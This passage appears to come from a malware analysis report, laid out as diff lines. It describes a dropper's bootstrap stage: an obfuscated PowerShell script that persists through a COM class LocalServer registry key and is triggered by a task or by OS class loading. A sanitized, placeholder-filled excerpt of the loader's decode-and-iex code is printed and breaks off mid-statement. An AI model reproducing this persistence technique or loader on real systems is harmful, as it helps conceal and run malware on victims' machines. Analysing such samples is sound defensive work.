@@ -1,0 +1,15 @@
+
+Bootstrap The bootstrap is implemented as an obfuscated PowerShell script, generated dynamically by the dropper.
+The content of the code is saved under the emulator's class LocalServer registry key
+and it is either executed by a dedicated task in case of a privileged PowerShell process or by the operating system that attempts to load the emulator for the PlaySoundService or
+MsCtfMonitor classes.
+The bootstrap code finds the location of the launcher script, decodes it and then executes it within the same PowerShell process.
+A decoded and sanitized version of the script is shown in Figure 7.
+$enc =
+[System.
+Text.
+Encoding]::UTF8; $loader =
+Get-ItemProperty -Path($enc.
+GetString([Convert]::FromBase64String('<base64_encoded_path_to_launcher>')))
+-n '<launcher_reg_val>' | Select-Object -ExpandProperty '<launcher_reg_val>'; $xor_val = <
+xor_val>; iex( $enc.
